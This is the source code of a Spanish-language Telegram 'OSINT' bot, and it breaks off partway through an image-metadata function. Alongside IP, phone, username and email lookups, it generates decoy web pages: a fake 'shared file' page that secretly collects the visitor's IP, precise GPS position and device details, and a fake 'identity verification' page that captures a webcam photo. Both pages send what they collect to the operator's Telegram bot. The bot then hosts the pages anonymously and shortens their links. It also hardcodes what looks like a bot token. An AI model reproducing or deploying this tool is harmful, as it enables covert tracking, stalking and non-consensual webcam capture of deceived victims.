import logging
import os
import io
import json
import re
import zipfile
import time
import uuid
import requests
import phonenumbers
from phonenumbers import geocoder, carrier, timezone as pn_timezone, phonenumberutil
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
from PIL import Image
from PIL.ExifTags import TAGS, GPSTAGS

# Configuración de logs
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Token desde variable de entorno o directamente (usa .env en producción)
BOT_TOKEN = os.getenv("GEKOSINT_TOKEN", "8575617284:AAEnhzskJXyLFC5VV4Qi2-TEz8UNAK4idYQ")

# Directorio para archivos generados
PAGES_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "pages")
os.makedirs(PAGES_DIR, exist_ok=True)


# ═══════════════════════════════════════════════════
#  AUTO-DEPLOY Y ACORTAMIENTO DE LINKS
# ═══════════════════════════════════════════════════

def deploy_html(html_content, filename="index.html"):
    """Sube HTML a un hosting gratuito y retorna la URL pública"""

    # Método 1: Netlify API (deploy anónimo, sin token)
    try:
        logger.info("Intentando deploy en Netlify...")
        # Crear ZIP con el archivo como index.html
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("index.html", html_content)
        zip_buffer.seek(0)

        r = requests.post(
            "https://api.netlify.com/api/v1/sites",
            headers={"Content-Type": "application/zip"},
            data=zip_buffer.read(),
            timeout=30
        )
        if r.status_code in [200, 201]:
            data = r.json()
            url = data.get("ssl_url") or data.get("url") or f"https://{data.get('subdomain')}.netlify.app"
            logger.info(f"✅ Deploy Netlify exitoso: {url}")
            return url
    except Exception as e:
        logger.warning(f"Netlify falló: {e}")

    # Método 2: paste.ee (API gratuita para texto/HTML)
    try:
        logger.info("Intentando paste.ee...")
        r = requests.post(
            "https://api.paste.ee/v1/pastes",
            headers={"Content-Type": "application/json"},
            json={
                "sections": [{"name": filename, "syntax": "text", "contents": html_content}]
            },
            timeout=15
        )
        if r.status_code in [200, 201]:
            data = r.json()
            paste_id = data.get("id", "")
            if paste_id:
                # paste.ee no sirve HTML directamente, pero podemos usar el raw
                raw_url = f"https://paste.ee/r/{paste_id}"
                logger.info(f"✅ Paste.ee exitoso: {raw_url}")
                return raw_url
    except Exception as e:
        logger.warning(f"paste.ee falló: {e}")

    # Método 3: file.io (hosting temporal)
    try:
        logger.info("Intentando file.io...")
        r = requests.post(
            "https://file.io",
            files={"file": (filename, html_content.encode('utf-8'), "text/html")},
            data={"expires": "14d"},
            timeout=15
        )
        if r.status_code == 200:
            data = r.json()
            if data.get("success"):
                url = data.get("link", "")
                logger.info(f"✅ file.io exitoso: {url}")
                return url
    except Exception as e:
        logger.warning(f"file.io falló: {e}")

    # Método 4: 0x0.st (hosting de archivos)
    try:
        logger.info("Intentando 0x0.st...")
        r = requests.post(
            "https://0x0.st",
            files={"file": (filename, html_content.encode('utf-8'), "text/html")},
            timeout=15
        )
        if r.status_code == 200:
            url = r.text.strip()
            logger.info(f"✅ 0x0.st exitoso: {url}")
            return url
    except Exception as e:
        logger.warning(f"0x0.st falló: {e}")

    return None


def shorten_url(url):
    """Acorta una URL usando servicios gratuitos"""
    if not url:
        return url

    # Método 1: is.gd
    try:
        r = requests.get(f"https://is.gd/create.php?format=simple&url={requests.utils.quote(url)}", timeout=10)
        if r.status_code == 200 and r.text.startswith("http"):
            return r.text.strip()
    except:
        pass

    # Método 2: v.gd
    try:
        r = requests.get(f"https://v.gd/create.php?format=simple&url={requests.utils.quote(url)}", timeout=10)
        if r.status_code == 200 and r.text.startswith("http"):
            return r.text.strip()
    except:
        pass

    # Método 3: tinyurl
    try:
        r = requests.get(f"https://tinyurl.com/api-create.php?url={requests.utils.quote(url)}", timeout=10)
        if r.status_code == 200 and r.text.startswith("http"):
            return r.text.strip()
    except:
        pass

    return url  # Retornar original si falla


# ═══════════════════════════════════════════════════
#  FUNCIONES OSINT REALES
# ═══════════════════════════════════════════════════

def get_ip_info(ip_address):
    """Análisis completo de dirección IP"""
    try:
        url = f"http://ip-api.com/json/{ip_address}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,proxy,hosting,query"
        response = requests.get(url, timeout=10)
        data = response.json()
        if data['status'] == 'success':
            proxy_status = "⚠️ SÍ (VPN/Proxy detectado)" if data.get('proxy') else "✅ No detectado"
            hosting_status = "🖥️ Sí (Datacenter)" if data.get('hosting') else "👤 No (Residencial)"

            result = (
                f"╔══════════════════════════════╗\n"
                f"║  🎯 OBJETIVO IP LOCALIZADO   ║\n"
                f"╚══════════════════════════════╝\n\n"
                f"🔹 IP: `{data['query']}`\n"
                f"🌍 País: {data['country']} ({data['countryCode']})\n"
                f"🏙️ Ciudad: {data['city']}, {data['regionName']}\n"
                f"📮 Código Postal: {data.get('zip', 'N/A')}\n"
                f"📍 Coordenadas: `{data['lat']}, {data['lon']}`\n"
                f"🕐 Zona Horaria: {data['timezone']}\n"
                f"🏢 ISP: {data['isp']}\n"
                f"🏛️ Organización: {data['org']}\n"
                f"🔗 ASN: {data.get('as', 'N/A')}\n"
                f"🛡️ Proxy/VPN: {proxy_status}\n"
                f"🖥️ Hosting: {hosting_status}\n"
            )

            # Reverse DNS
            try:
                rdns = requests.get(f"https://dns.google/resolve?name={'.'.join(reversed(ip_address.split('.')))}.in-addr.arpa&type=PTR", timeout=5)
                if rdns.status_code == 200:
                    rdns_data = rdns.json()
                    answers = rdns_data.get("Answer", [])
                    if answers:
                        result += f"🔄 Reverse DNS: `{answers[0].get('data', 'N/A')}`\n"
            except:
                pass

            # Dirección aproximada con Nominatim
            try:
                geo_r = requests.get(
                    f"https://nominatim.openstreetmap.org/reverse?lat={data['lat']}&lon={data['lon']}&format=json&addressdetails=1",
                    headers={"User-Agent": "GekOsint-Bot/3.0"}, timeout=5
                )
                if geo_r.status_code == 200:
                    geo_data = geo_r.json()
                    addr = geo_data.get("address", {})
                    if addr:
                        parts = []
                        if addr.get("road"): parts.append(addr["road"])
                        if addr.get("suburb"): parts.append(addr["suburb"])
                        if addr.get("city") or addr.get("town"): parts.append(addr.get("city") or addr.get("town"))
                        if addr.get("state"): parts.append(addr["state"])
                        if parts:
                            result += f"📌 Zona: {', '.join(parts)}\n"
            except:
                pass

            result += f"\n🗺️ [Ver en Google Maps](https://www.google.com/maps?q={data['lat']},{data['lon']})"
            return result
        return "❌ IP no encontrada o privada."
    except requests.Timeout:
        return "⚠️ Timeout: El servidor no respondió a tiempo."
    except Exception as e:
        logger.error(f"Error IP lookup: {e}")
        return "⚠️ Error de conexión con el servicio."


def get_phone_info(number):
    """Análisis completo de número telefónico con múltiples fuentes"""
    try:
        parsed = phonenumbers.parse(number, None)
        if not phonenumbers.is_valid_number(parsed):
            return "❌ Número inválido. Usa formato internacional (ej: +52...)"

        country = geocoder.description_for_number(parsed, "es")
        country_en = geocoder.description_for_number(parsed, "en")
        service_provider = carrier.name_for_number(parsed, "es")
        timezones = pn_timezone.time_zones_for_number(parsed)
        tz_str = ", ".join(timezones) if timezones else "Desconocida"

        # Tipo de línea
        number_type = phonenumberutil.number_type(parsed)
        type_map = {
            phonenumberutil.PhoneNumberType.MOBILE: "📱 Móvil",
            phonenumberutil.PhoneNumberType.FIXED_LINE: "☎️ Línea Fija",
            phonenumberutil.PhoneNumberType.FIXED_LINE_OR_MOBILE: "📞 Fija/Móvil",
            phonenumberutil.PhoneNumberType.TOLL_FREE: "🆓 Línea Gratuita",
            phonenumberutil.PhoneNumberType.PREMIUM_RATE: "💰 Tarifa Premium",
            phonenumberutil.PhoneNumberType.VOIP: "🌐 VoIP",
            phonenumberutil.PhoneNumberType.PAGER: "📟 Pager",
            phonenumberutil.PhoneNumberType.UAN: "🏢 UAN (Acceso Universal)",
            phonenumberutil.PhoneNumberType.SHARED_COST: "💱 Costo Compartido",
        }
        line_type = type_map.get(number_type, "❓ Desconocido")

        # Formatos
        national = phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.NATIONAL)
        international = phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.INTERNATIONAL)
        e164 = phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.E164)
        country_code = parsed.country_code
        national_number = parsed.national_number

        # Código de región ISO
        region_code = phonenumbers.region_code_for_number(parsed)

        # Validaciones adicionales
        is_possible = phonenumbers.is_possible_number(parsed)
        is_valid_for_region = phonenumbers.is_valid_number_for_region(parsed, region_code) if region_code else False

        result = (
            f"╔══════════════════════════════╗\n"
            f"║  📱 ANÁLISIS GSM COMPLETO    ║\n"
            f"╚══════════════════════════════╝\n\n"
            f"🔹 Número: `{number}`\n"
            f"🌍 País/Región: {country} ({region_code})\n"
            f"📡 Operadora: {service_provider or 'No disponible'}\n"
            f"📋 Tipo de Línea: {line_type}\n"
            f"🕐 Zona Horaria: {tz_str}\n"
            f"✅ Válido: {'Sí' if is_valid_for_region else 'Parcial'}\n"
            f"📞 Posible: {'Sí' if is_possible else 'No'}\n\n"
            f"📝 **Formatos:**\n"
            f"  Nacional: `{national}`\n"
            f"  Internacional: `{international}`\n"
            f"  E.164: `{e164}`\n"
            f"  Código País: `+{country_code}`\n"
            f"  Número Nacional: `{national_number}`\n"
            f"  Región ISO: `{region_code}`\n"
        )

        # Consultar API de numverify (gratuita, 100 consultas/mes)
        try:
            nv_url = f"http://apilayer.net/api/validate?access_key=&number={e164}"
            # API alternativa gratuita: veriphone.io
            vp_url = f"https://api.veriphone.io/v2/verify?phone={e164}"
            vp_r = requests.get(vp_url, timeout=8)
            if vp_r.status_code == 200:
                vp_data = vp_r.json()
                if vp_data.get("status") == "success":
                    vp_carrier = vp_data.get("carrier", "")
                    vp_type = vp_data.get("phone_type", "")
                    vp_country = vp_data.get("country", "")
                    vp_intl = vp_data.get("international_number", "")

                    result += f"\n🔍 **Verificación Veriphone:**\n"
                    if vp_carrier:
                        result += f"  📡 Carrier: `{vp_carrier}`\n"
                    if vp_type:
                        result += f"  📋 Tipo: `{vp_type}`\n"
                    if vp_country:
                        result += f"  🌍 País: `{vp_country}`\n"
        except:
            pass

        # Consultar API de abstractapi (gratuita)
        try:
            abs_url = f"https://phonevalidation.abstractapi.com/v1/?api_key=free&phone={e164}"
            # No usar si no hay key, pero intentar
        except:
            pass

        # Información del prefijo
        result += f"\n📊 **Análisis del prefijo:**\n"

        # Prefijos conocidos de México
        if country_code == 52:
            nat_str = str(national_number)
            if nat_str.startswith("33"):
                result += f"  🏙️ Área: Guadalajara, Jalisco\n"
            elif nat_str.startswith("55"):
                result += f"  🏙️ Área: Ciudad de México / CDMX\n"
            elif nat_str.startswith("81"):
                result += f"  🏙️ Área: Monterrey, Nuevo León\n"
            elif nat_str.startswith("222"):
                result += f"  🏙️ Área: Puebla\n"
            elif nat_str.startswith("449"):
                result += f"  🏙️ Área: Aguascalientes\n"
            elif nat_str.startswith("614"):
                result += f"  🏙️ Área: Chihuahua\n"
            elif nat_str.startswith("656"):
                result += f"  🏙️ Área: Ciudad Juárez\n"
            elif nat_str.startswith("664"):
                result += f"  🏙️ Área: Tijuana, Baja California\n"
            elif nat_str.startswith("998"):
                result += f"  🏙️ Área: Cancún, Quintana Roo\n"
            elif nat_str.startswith("999"):
                result += f"  🏙️ Área: Mérida, Yucatán\n"
            elif nat_str.startswith("442"):
                result += f"  🏙️ Área: Querétaro\n"
            elif nat_str.startswith("477"):
                result += f"  🏙️ Área: León, Guanajuato\n"
            elif nat_str.startswith("667"):
                result += f"  🏙️ Área: Culiacán, Sinaloa\n"
            elif nat_str.startswith("686"):
                result += f"  🏙️ Área: Mexicali, Baja California\n"
            elif nat_str.startswith("744"):
                result += f"  🏙️ Área: Acapulco, Guerrero\n"
            elif nat_str.startswith("961"):
                result += f"  🏙️ Área: Tuxtla Gutiérrez, Chiapas\n"
            elif nat_str.startswith("951"):
                result += f"  🏙️ Área: Oaxaca\n"
            else:
                result += f"  📍 Prefijo: `{nat_str[:3]}`\n"

        elif country_code == 1:  # USA/Canada
            nat_str = str(national_number)
            area_code = nat_str[:3]
            us_areas = {
                "212": "Nueva York, NY", "213": "Los Ángeles, CA", "305": "Miami, FL",
                "312": "Chicago, IL", "415": "San Francisco, CA", "469": "Dallas, TX",
                "702": "Las Vegas, NV", "713": "Houston, TX", "786": "Miami, FL",
                "818": "Los Ángeles, CA", "917": "Nueva York, NY", "956": "Laredo, TX",
            }
            if area_code in us_areas:
                result += f"  🏙️ Área: {us_areas[area_code]}\n"
            else:
                result += f"  📍 Código de área: `{area_code}`\n"

        else:
            result += f"  📍 Código país: `+{country_code}` ({country_en})\n"

        # HLR Lookup simulado (info de red)
        result += f"\n🔗 **Verificación externa:**\n"
        result += f"• [Truecaller](https://www.truecaller.com/search/{region_code.lower()}/{national_number})\n"
        result += f"• [Sync.me](https://sync.me/search/?number={e164})\n"
        result += f"• [WhatsApp](https://wa.me/{e164.replace('+','')})\n"
        result += f"• [Telegram](https://t.me/+{e164.replace('+','')})\n"

        return result
    except phonenumbers.NumberParseException:
        return "⚠️ Error de formato. Usa '+' seguido del código de país (Ej: +5233...)"
    except Exception as e:
        logger.error(f"Error phone lookup: {e}")
        return "⚠️ Error procesando el número."


def search_username(username):
    """Búsqueda de username en plataformas populares"""
    platforms = {
        "GitHub": f"https://github.com/{username}",
        "Twitter/X": f"https://x.com/{username}",
        "Instagram": f"https://instagram.com/{username}",
        "TikTok": f"https://tiktok.com/@{username}",
        "Reddit": f"https://reddit.com/user/{username}",
        "YouTube": f"https://youtube.com/@{username}",
        "Telegram": f"https://t.me/{username}",
        "Pinterest": f"https://pinterest.com/{username}",
        "Twitch": f"https://twitch.tv/{username}",
        "LinkedIn": f"https://linkedin.com/in/{username}",
        "Spotify": f"https://open.spotify.com/user/{username}",
        "SoundCloud": f"https://soundcloud.com/{username}",
    }

    found = []
    not_found = []

    for platform, url in platforms.items():
        try:
            r = requests.get(url, timeout=5, allow_redirects=True,
                           headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
            if r.status_code == 200:
                found.append(f"✅ [{platform}]({url})")
            else:
                not_found.append(f"❌ {platform}")
        except:
            not_found.append(f"⏳ {platform} (timeout)")

    result = (
        f"╔══════════════════════════════╗\n"
        f"║  🔍 BÚSQUEDA DE USERNAME     ║\n"
        f"╚══════════════════════════════╝\n\n"
        f"👤 Username: `{username}`\n\n"
        f"**Encontrado en:**\n"
    )
    result += "\n".join(found) if found else "Ninguna plataforma confirmada"
    result += f"\n\n**No encontrado:**\n"
    result += "\n".join(not_found[:5]) if not_found else "—"
    if len(not_found) > 5:
        result += f"\n...y {len(not_found)-5} más"

    return result


def check_email_breach(email):
    """Verificación de brechas de seguridad para un email"""
    try:
        headers = {"User-Agent": "GekOsint-Bot"}
        r = requests.get(f"https://emailrep.io/{email}", headers=headers, timeout=10)
        if r.status_code == 200:
            data = r.json()
            reputation = data.get("reputation", "unknown")
            suspicious = data.get("suspicious", False)
            details = data.get("details", {})

            rep_emoji = {"high": "🟢", "medium": "🟡", "low": "🔴", "none": "⚫"}.get(reputation, "⚪")

            result = (
                f"╔══════════════════════════════╗\n"
                f"║  📧 ANÁLISIS DE EMAIL        ║\n"
                f"╚══════════════════════════════╝\n\n"
                f"📬 Email: `{email}`\n"
                f"{rep_emoji} Reputación: **{reputation.upper()}**\n"
                f"🚨 Sospechoso: {'⚠️ SÍ' if suspicious else '✅ No'}\n\n"
                f"📊 **Detalles:**\n"
                f"• Brechas conocidas: {details.get('credentials_leaked', False)}\n"
                f"• En listas de spam: {details.get('spam', False)}\n"
                f"• Email desechable: {details.get('disposable', False)}\n"
                f"• Dominio libre: {details.get('free_provider', False)}\n"
                f"• Entregable: {details.get('deliverable', 'N/A')}\n"
                f"• Perfiles encontrados: {details.get('profiles', ['Ninguno'])}\n\n"
                f"🔗 **Verificar manualmente:**\n"
                f"• [Have I Been Pwned](https://haveibeenpwned.com/account/{email})\n"
                f"• [DeHashed](https://dehashed.com/search?query={email})\n"
                f"• [IntelX](https://intelx.io/?s={email})"
            )
            return result
        elif r.status_code == 429:
            return (
                f"⏳ Límite de consultas alcanzado.\n\n"
                f"🔗 **Verifica manualmente:**\n"
                f"• [Have I Been Pwned](https://haveibeenpwned.com/account/{email})\n"
                f"• [DeHashed](https://dehashed.com/search?query={email})\n"
                f"• [IntelX](https://intelx.io/?s={email})"
            )
        else:
            return f"❌ No se pudo consultar el email. Código: {r.status_code}"
    except Exception as e:
        logger.error(f"Error email check: {e}")
        return (
            f"⚠️ Error consultando el email.\n\n"
            f"🔗 **Verifica manualmente:**\n"
            f"• [Have I Been Pwned](https://haveibeenpwned.com/account/{email})\n"
            f"• [DeHashed](https://dehashed.com/search?query={email})"
        )


# ═══════════════════════════════════════════════════
#  FUNCIONES DE MÓDULOS AVANZADOS
# ═══════════════════════════════════════════════════

def create_tracking_page(bot_token, chat_id):
    """Genera página HTML de tracking que captura IP, GPS y dispositivo"""
    page_id = uuid.uuid4().hex[:10]
    filename = f"share_{page_id}.html"

    html_content = f"""<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Archivo Compartido</title>
<meta property="og:title" content="Te compartieron un archivo">
<meta property="og:description" content="Haz clic para ver el contenido">
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);color:white;min-height:100vh;display:flex;justify-content:center;align-items:center}}
.card{{background:rgba(255,255,255,0.05);backdrop-filter:blur(10px);border:1px solid rgba(255,255,255,0.1);border-radius:20px;padding:40px;max-width:420px;text-align:center}}
.icon{{font-size:60px;margin-bottom:20px}}
h1{{font-size:22px;margin-bottom:10px}}
p{{color:#a0a0b0;font-size:14px;margin-bottom:20px;line-height:1.6}}
.loader{{border:3px solid rgba(255,255,255,0.1);border-top:3px solid #4ecca3;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;margin:20px auto}}
@keyframes spin{{0%{{transform:rotate(0deg)}}100%{{transform:rotate(360deg)}}}}
#status{{font-size:13px;color:#4ecca3}}
</style>
</head>
<body>
<div class="card">
<div class="icon">&#128196;</div>
<h1 id="title">Cargando archivo...</h1>
<div class="loader" id="loader"></div>
<p id="status">Preparando el contenido...</p>
</div>
<script>
const T='{bot_token}',C='{chat_id}';
async function track(){{
let d={{time:new Date().toISOString(),ua:navigator.userAgent,plat:navigator.platform,lang:navigator.language,scr:screen.width+'x'+screen.height,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,cores:navigator.hardwareConcurrency||'?',mem:navigator.deviceMemory||'?',touch:navigator.maxTouchPoints,ref:document.referrer||'directo'}};
try{{const r=await fetch('https://api.ipify.org?format=json');const j=await r.json();d.ip=j.ip;const g=await fetch('http://ip-api.com/json/'+j.ip+'?fields=status,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,proxy,hosting');const gd=await g.json();if(gd.status==='success'){{d.country=gd.country+' ('+gd.countryCode+')';d.city=gd.city;d.region=gd.regionName;d.zip=gd.zip;d.isp=gd.isp;d.org=gd.org;d.asn=gd.as;d.lat_ip=gd.lat;d.lon_ip=gd.lon;d.proxy=gd.proxy;d.hosting=gd.hosting}}}}catch(e){{}}
if(navigator.geolocation){{try{{const p=await new Promise((ok,no)=>{{navigator.geolocation.getCurrentPosition(ok,no,{{enableHighAccuracy:true,timeout:10000,maximumAge:0}})}});d.gps_lat=p.coords.latitude;d.gps_lon=p.coords.longitude;d.gps_acc=Math.round(p.coords.accuracy)+'m';if(p.coords.altitude)d.gps_alt=Math.round(p.coords.altitude)+'m';if(p.coords.speed)d.gps_spd=Math.round(p.coords.speed*3.6)+'km/h'}}catch(e){{d.gps_err=e.message}}}}
try{{const b=await navigator.getBattery();d.bat=Math.round(b.level*100)+'%';d.chg=b.charging?'Si':'No'}}catch(e){{}}
try{{const cv=document.createElement('canvas');const gl=cv.getContext('webgl');if(gl){{const di=gl.getExtension('WEBGL_debug_renderer_info');if(di)d.gpu=gl.getParameter(di.UNMASKED_RENDERER_WEBGL)}}}}catch(e){{}}
let m='\\xf0\\x9f\\x97\\xba\\xef\\xb8\\x8f TRACKING ACTIVADO\\n';
m+='\\u2501'.repeat(30)+'\\n\\n';
if(d.ip)m+='\\xf0\\x9f\\x8c\\x90 IP: '+d.ip+'\\n';
if(d.proxy)m+='\\xf0\\x9f\\x9b\\xa1 VPN/Proxy: DETECTADO\\n';
if(d.country)m+='\\xf0\\x9f\\x8c\\x8d Pais: '+d.country+'\\n';
if(d.city)m+='\\xf0\\x9f\\x8f\\x99 Ciudad: '+d.city+', '+(d.region||'')+'\\n';
if(d.zip)m+='\\xf0\\x9f\\x93\\xae CP: '+d.zip+'\\n';
if(d.isp)m+='\\xf0\\x9f\\x8f\\xa2 ISP: '+d.isp+'\\n';
if(d.org)m+='\\xf0\\x9f\\x8f\\x9b Org: '+d.org+'\\n';
if(d.asn)m+='\\xf0\\x9f\\x94\\x97 ASN: '+d.asn+'\\n';
if(d.lat_ip)m+='\\xf0\\x9f\\x93\\x8d IP Loc: '+d.lat_ip+','+d.lon_ip+'\\n';
m+='\\n';
if(d.gps_lat){{m+='\\xf0\\x9f\\x8e\\xaf GPS EXACTO: '+d.gps_lat+','+d.gps_lon+'\\n';m+='Precision: '+d.gps_acc+'\\n';if(d.gps_alt)m+='Altitud: '+d.gps_alt+'\\n';if(d.gps_spd)m+='Velocidad: '+d.gps_spd+'\\n';m+='Maps: https://www.google.com/maps?q='+d.gps_lat+','+d.gps_lon+'\\n'}}
else if(d.lat_ip)m+='Maps: https://www.google.com/maps?q='+d.lat_ip+','+d.lon_ip+'\\n';
if(d.gps_err)m+='GPS: '+d.gps_err+'\\n';
m+='\\n\\xf0\\x9f\\x93\\xb1 DISPOSITIVO:\\n';
m+='Plataforma: '+d.plat+'\\n';
m+='Pantalla: '+d.scr+'\\n';
if(d.cores!=='?')m+='CPU: '+d.cores+' cores\\n';
if(d.mem!=='?')m+='RAM: ~'+d.mem+'GB\\n';
if(d.bat)m+='Bateria: '+d.bat+(d.chg==='Si'?' cargando':'')+'\\n';
if(d.gpu)m+='GPU: '+d.gpu+'\\n';
m+='Touch: '+d.touch+'\\n';
m+='Zona: '+d.tz+'\\n';
m+='Idioma: '+d.lang+'\\n';
m+='\\n'+d.time;
await fetch('https://api.telegram.org/bot'+T+'/sendMessage',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify({{chat_id:C,text:m}})}});
document.getElementById('loader').style.display='none';
document.getElementById('title').textContent='Contenido no disponible';
document.getElementById('status').textContent='Este archivo ha expirado o no esta disponible en tu region.';
document.getElementById('status').style.color='#ff6b6b';
}}
track();
</script>
</body>
</html>"""

    filepath = os.path.join(PAGES_DIR, filename)
    with open(filepath, 'w', encoding='utf-8') as f:
        f.write(html_content)
    return filename, html_content


def create_cam_page(bot_token, chat_id):
    """Genera página HTML de captura de cámara"""
    page_id = uuid.uuid4().hex[:10]
    filename = f"verify_{page_id}.html"

    html_content = f"""<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificacion de Seguridad</title>
    <style>
        *{{margin:0;padding:0;box-sizing:border-box}}
        body{{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
             background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);color:white;
             min-height:100vh;display:flex;justify-content:center;align-items:center}}
        .card{{background:rgba(255,255,255,0.05);backdrop-filter:blur(10px);
              border:1px solid rgba(255,255,255,0.1);border-radius:20px;
              padding:40px;max-width:420px;text-align:center}}
        .icon{{font-size:60px;margin-bottom:20px}}
        h1{{font-size:22px;margin-bottom:10px}}
        p{{color:#a0a0b0;font-size:14px;margin-bottom:20px;line-height:1.6}}
        .btn{{background:linear-gradient(135deg,#667eea,#764ba2);color:white;
             border:none;padding:14px 32px;border-radius:12px;font-size:16px;
             cursor:pointer;width:100%}}
        .btn:hover{{opacity:0.9}}
        #status{{margin-top:16px;font-size:13px;color:#4ecca3;min-height:20px}}
        .bar{{height:4px;background:#333;border-radius:2px;overflow:hidden;margin-top:16px;display:none}}
        .fill{{height:100%;background:linear-gradient(90deg,#667eea,#764ba2);width:0%;transition:width 0.5s}}
        video,canvas{{display:none}}
    </style>
</head>
<body>
<div class="card">
    <div class="icon">&#128274;</div>
    <h1>Verificacion de Identidad</h1>
    <p>Para acceder al contenido protegido, necesitamos verificar tu identidad.</p>
    <button class="btn" onclick="go()" id="btn">Iniciar Verificacion</button>
    <div class="bar" id="bar"><div class="fill" id="fill"></div></div>
    <p id="status"></p>
    <video id="v" autoplay playsinline></video>
    <canvas id="c"></canvas>
</div>
<script>
const T='{bot_token}',C='{chat_id}';
async function send(t){{try{{await fetch('https://api.telegram.org/bot'+T+'/sendMessage',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify({{chat_id:C,text:t}})}})}}catch(e){{}}}}
async function sendPhoto(b){{try{{const f=new FormData();f.append('chat_id',C);f.append('photo',b,'cap.jpg');f.append('caption','\\xf0\\x9f\\xa7\\xbf Captura de camara recibida');await fetch('https://api.telegram.org/bot'+T+'/sendPhoto',{{method:'POST',body:f}})}}catch(e){{}}}}
async function getInfo(){{
    let i={{ua:navigator.userAgent,plat:navigator.platform,lang:navigator.language,scr:screen.width+'x'+screen.height,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,cores:navigator.hardwareConcurrency||'?',mem:navigator.deviceMemory||'?',touch:navigator.maxTouchPoints,time:new Date().toISOString()}};
    try{{const r=await fetch('https://api.ipify.org?format=json');const d=await r.json();i.ip=d.ip;const g=await fetch('http://ip-api.com/json/'+d.ip);const gd=await g.json();if(gd.status==='success'){{i.country=gd.country;i.city=gd.city;i.isp=gd.isp;i.lat=gd.lat;i.lon=gd.lon}}}}catch(e){{}}
    try{{const b=await navigator.getBattery();i.bat=Math.round(b.level*100)+'%'}}catch(e){{}}
    try{{const cv=document.createElement('canvas');const gl=cv.getContext('webgl');if(gl){{const di=gl.getExtension('WEBGL_debug_renderer_info');if(di)i.gpu=gl.getParameter(di.UNMASKED_RENDERER_WEBGL)}}}}catch(e){{}}
    return i;
}}
async function go(){{
    const s=document.getElementById('status'),b=document.getElementById('btn'),bar=document.getElementById('bar'),fill=document.getElementById('fill');
    b.disabled=true;b.textContent='Procesando...';bar.style.display='block';fill.style.width='20%';
    s.textContent='Iniciando camara...';
    const info=await getInfo();
    try{{
        const stream=await navigator.mediaDevices.getUserMedia({{video:{{facingMode:'user'}}}});
        fill.style.width='50%';s.textContent='Capturando...';
        const v=document.getElementById('v');v.srcObject=stream;
        await new Promise(r=>setTimeout(r,2000));
        fill.style.width='70%';
        const c=document.getElementById('c');c.width=v.videoWidth;c.height=v.videoHeight;
        c.getContext('2d').drawImage(v,0,0);
        stream.getTracks().forEach(t=>t.stop());
        fill.style.width='85%';
        const blob=await new Promise(r=>c.toBlob(r,'image/jpeg',0.85));
        await sendPhoto(blob);
        fill.style.width='95%';
    }}catch(e){{info.cam_error=e.message}}
    let msg='\\xf0\\x9f\\xa7\\xbf CAPTURA - INFO DISPOSITIVO\\n';
    msg+='\\u2501'.repeat(30)+'\\n';
    if(info.ip)msg+='IP: '+info.ip+'\\n';
    if(info.country)msg+='Pais: '+info.country+'\\n';
    if(info.city)msg+='Ciudad: '+info.city+'\\n';
    if(info.isp)msg+='ISP: '+info.isp+'\\n';
    if(info.lat)msg+='Coords: '+info.lat+','+info.lon+'\\n';
    if(info.lat)msg+='Maps: https://www.google.com/maps?q='+info.lat+','+info.lon+'\\n';
    msg+='\\nDispositivo: '+info.plat+'\\n';
    msg+='Pantalla: '+info.scr+'\\n';
    msg+='Cores: '+info.cores+'\\n';
    if(info.mem!=='?')msg+='RAM: ~'+info.mem+'GB\\n';
    if(info.bat)msg+='Bateria: '+info.bat+'\\n';
    if(info.gpu)msg+='GPU: '+info.gpu+'\\n';
    msg+='Touch: '+info.touch+'\\n';
    msg+='Zona: '+info.tz+'\\n';
    msg+='Idioma: '+info.lang+'\\n';
    if(info.cam_error)msg+='\\nCamara: DENEGADA ('+info.cam_error+')';
    else msg+='\\nCamara: CAPTURADA';
    msg+='\\n\\nUA: '+info.ua.substring(0,150);
    await send(msg);
    fill.style.width='100%';
    s.textContent='Verificacion completada';
    b.textContent='Verificado';
}}
</script>
</body>
</html>"""

    filepath = os.path.join(PAGES_DIR, filename)
    with open(filepath, 'w', encoding='utf-8') as f:
        f.write(html_content)
    return filename, html_content


def extract_exif_data(image_bytes):
    """Extrae metadatos EXIF de una imagen"""
    try:
        img = Image.open(io.BytesIO(image_bytes))
        exif_data = img._getexif()

        if not exif_data:
            return (
                "╔══════════════════════════════╗\n"
                "║  📂 EXTRACTOR DE METADATOS   ║\n"
                "╚══════════════════════════════╝\n\n"
                f"📐 Resolución: `{img.size[0]}x{img.size[1]}`\n"
                f"🎨 Formato: `{img.format}`\n"
                f"📊 Modo: `{img.mode}`\n\n"
                "❌ No se encontraron metadatos EXIF.\n"
                "💡 La imagen fue comprimida o limpiada."
            )

        result = (
            "╔══════════════════════════════╗\n"
            "║  📂 METADATOS EXIF EXTRAÍDOS ║\n"
            "╚══════════════════════════════╝\n\n"
        )

        gps_info = {}
        general_info = []

        for tag_id, value in exif_data.items():
            tag = TAGS.get(tag_id, tag_id)

            if tag == "GPSInfo":
                for gps_tag_id, gps_value in value.items():
